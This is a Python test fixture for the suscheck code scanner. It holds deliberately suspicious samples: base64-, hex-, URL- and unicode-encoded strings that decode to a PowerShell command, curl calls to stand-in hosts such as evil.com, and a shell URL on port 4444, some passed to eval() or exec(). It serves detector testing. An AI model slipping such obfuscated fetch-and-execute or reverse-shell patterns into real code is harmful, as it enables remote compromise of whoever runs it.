#!/usr/bin/env python3
"""
MALICIOUS TEST SAMPLE — DO NOT RUN.
This file contains intentionally suspicious patterns
for testing suscheck's code scanner detectors.
"""

import base64
import os

# Base64-encoded reverse shell command
payload = "cG93ZXJzaGVsbCAtZSBKQUIwWVcxbElDMWxJRzVsZENCelkyczlk"
decoded = base64.b64decode(payload)
eval(decoded)

# Nested encoding: base64 inside hex
hex_payload = "\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d"

# URL-encoded command
url_cmd = "%63%75%72%6c%20%68%74%74%70%3a%2f%2f%6d%61%6c%77%61%72%65%2e%63%6f%6d%2f%70%61%79%6c%6f%61%64"

# Unicode escapes
uni_str = "\u0065\u0076\u0061\u006c\u0028\u0029"

# Another base64 with suspicious content
c2_encoded = "aHR0cDovLzE5Mi4xNjguMS4xMDA6NDQ0NC9zaGVsbA=="
exec(base64.b64decode(c2_encoded))
